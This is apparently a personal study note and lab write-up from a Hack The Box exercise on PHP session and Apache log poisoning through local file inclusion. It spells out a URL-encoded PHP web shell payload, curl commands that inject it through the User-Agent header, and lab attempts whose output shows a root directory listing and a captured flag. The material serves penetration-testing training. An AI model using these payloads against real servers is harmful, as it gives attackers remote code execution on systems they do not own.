# Log Poisoning

Principle : injection of malicious PHP file which will be written in a log file and then executed

Requirement : PHP function needs to have the writing rights on log files

## PHP Session Poisoning

The PHPSESSID cookies is used by the application to track the activity of a specific user.

These details are stored in session files on the back-end :
- /var/lib/php/sessions/ on Linux
- C:\Windows\Temp\ on Windows

The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix.

If PHPSESSID=el4ukv0kqbvoirg7nkp4dncpk3 :
/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3

### Check our PHPSESSID

If PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

Try to change a value (for example the page) and see if it changes on our session file :
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning

And then :

http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd


Poisoning with a shell :
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

--> We have to poison the session file at each new command

## Server Log Poisoning

### Check access logs

http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log

### Use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning

User-Agent : <?php system($_GET["cmd"]); ?>

Also possible by using cURL :
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"

http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id

We can use it on various system logs :
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log

--> We should first attempt reading these logs through LFI, and if we do have access to them
--> Can also use SSH or FTP services if they are exposed to us

## LAB

http://83.136.251.235:48611/

### PHPSSEID Poisoning

Cookie: PHPSESSID=bgsa1umh0ch4givtc1gr78ofo8

http://83.136.251.235:48611/index.php?language=/var/lib/php/sessions/sess_bgsa1umh0ch4givtc1gr78ofo8

selected_language|s:53:"/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd";preference|s:7:"Spanish";

http://83.136.251.235:48611/index.php?language=session_poisoning

selected_language|s:17:"session_poisoning";preference|s:7:"Spanish";

http://83.136.251.235:48611/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

http://83.136.251.235:48611/index.php?language=/var/lib/php/sessions/sess_bgsa1umh0ch4givtc1gr78ofo8&cmd=pwd

selected_language|s:29:"/var/www/html ";preference|s:7:"Spanish";

### Log file poisoning

http://83.136.251.235:48611/index.php?language=/var/log/apache2/access.log

--> OK

10.30.12.138 - - [01/Jan/2024:12:19:30 +0000] "GET / HTTP/1.1" 200 1429 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36" 
...

Burp :

User-Agent : <?php system($_GET["cmd"]); ?>

10.30.12.138 - - [01/Jan/2024:12:32:34 +0000] "GET /index.php?language=/var/log/apache2/access.log HTTP/1.1" 200 1381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36"

http://83.136.251.235:48611/index.php?language=/var/log/apache2/access.log&cmd=ls -l /

--> Failed : Error 500 (change TARGET)

curl -s "http://94.237.56.188:56610/index.php" -A "<?php system($_GET[cmd]); ?>"

http://94.237.56.188:56610/index.php?language=/var/log/apache2/access.log&cmd=id

--> Failed

Cookie: PHPSESSID=s24fad3sfq22u1aoaa84evqvao

http://94.237.56.188:56610/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

http://94.237.56.188:56610/index.php?language=/var/lib/php/sessions/sess_s24fad3sfq22u1aoaa84evqvao&cmd=ls -l /

selected_language|s:29:"total 60 lrwxrwxrwx 1 root root 7 Jul 20 2020 bin -> usr/bin drwxr-xr-x 2 root root 4096 Apr 15 2020 boot -rw-r--r-- 1 root root 34 Mar 25 2022 c85ee5082f4c723ace6c0796e3a3db09.txt drwxr-xr-x 5 root root 360 Jan 1 12:35 dev drwxr-xr-x 1 root root 4096 Feb 14 2021 etc drwxr-xr-x 2 root root 4096 Apr 15 2020 home lrwxrwxrwx 1 root root 7 Jul 20 2020 lib -> usr/lib lrwxrwxrwx 1 root root 9 Jul 20 2020 lib32 -> usr/lib32 lrwxrwxrwx 1 root root 9 Jul 20 2020 lib64 -> usr/lib64 lrwxrwxrwx 1 root root 10 Jul 20 2020 libx32 -> usr/libx32 drwxr-xr-x 2 root root 4096 Jul 20 2020 media drwxr-xr-x 2 root root 4096 Jul 20 2020 mnt drwxr-xr-x 2 root root 4096 Jul 20 2020 opt dr-xr-xr-x 417 root root 0 Jan 1 12:35 proc drwx------ 1 root root 4096 Aug 19 2020 root drwxr-xr-x 1 root root 4096 Feb 14 2021 run lrwxrwxrwx 1 root root 8 Jul 20 2020 sbin -> usr/sbin drwxr-xr-x 2 root root 4096 Jul 20 2020 srv dr-xr-xr-x 13 root root 0 Jan 1 12:35 sys drwxrwxrwt 1 root root 4096 Jan 1 12:35 tmp drwxr-xr-x 1 root root 4096 Jul 20 2020 usr drwxr-xr-x 1 root root 4096 Aug 19 2020 var ";preference|s:7:"Spanish";

http://94.237.56.188:56610/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

http://94.237.56.188:56610/index.php?language=/var/lib/php/sessions/sess_s24fad3sfq22u1aoaa84evqvao&cmd=cat /c85ee5082f4c723ace6c0796e3a3db09.txt

selected_language|s:29:"HTB{1095_5#0u1d_n3v3r_63_3xp053d} ";preference|s:7:"Spanish";

83.136.251.235:43417
http://83.136.251.235:43417/index.php?language=/var/log/apache2/access.log

curl -i -v http://83.136.251.235:46629 6 -A "<?php system('ls -l /'); ?>"

http://83.136.251.235:46629/index.php?language=/var/log/apache2/access.log

10.30.12.138 - - [02/Jan/2024:11:49:31 +0000] "GET / HTTP/1.1" 200 3001 "-" "total 60 lrwxrwxrwx 1 root root 7 Jul 20 2020 bin -> usr/bin drwxr-xr-x 2 root root 4096 Apr 15 2020 boot -rw-r--r-- 1 root root 34 Mar 25 2022 c85ee5082f4c723ace6c0796e3a3db09.txt drwxr-xr-x 5 root root 360 Jan 2 11:48 dev drwxr-xr-x 1 root root 4096 Feb 14 2021 etc drwxr-xr-x 2 root root 4096 Apr 15 2020 home lrwxrwxrwx 1 root root 7 Jul 20 2020 lib -> usr/lib lrwxrwxrwx 1 root root 9 Jul 20 2020 lib32 -> usr/lib32 lrwxrwxrwx 1 root root 9 Jul 20 2020 lib64 -> usr/lib64 lrwxrwxrwx 1 root root 10 Jul 20 2020 libx32 -> usr/libx32 drwxr-xr-x 2 root root 4096 Jul 20 2020 media drwxr-xr-x 2 root root 4096 Jul 20 2020 mnt drwxr-xr-x 2 root root 4096 Jul 20 2020 opt dr-xr-xr-x 472 root root 0 Jan 2 11:48 proc drwx------ 1 root root 4096 Aug 19 2020 root drwxr-xr-x 1 root root 4096 Feb 14 2021 run lrwxrwxrwx 1 root root 8 Jul 20 2020 sbin -> usr/sbin drwxr-xr-x 2 root root 4096 Jul 20 2020 srv dr-xr-xr-x 13 root root 0 Jan 2 11:48 sys drwxrwxrwt 1 root root 4096 Jan 2 11:48 tmp drwxr-xr-x 1 root root 4096 Jul 20 2020 usr drwxr-xr-x 1 root root 4096 Aug 19 2020 var "

curl -i -v http://83.136.251.235:46629 6 -A "<?php system('cat /c85ee5082f4c723ace6c0796e3a3db09.txt'); ?>"

10.30.12.138 - - [02/Jan/2024:11:51:47 +0000] "GET / HTTP/1.1" 200 3001 "-" "HTB{1095_5#0u1d_n3v3r_63_3xp053d} "

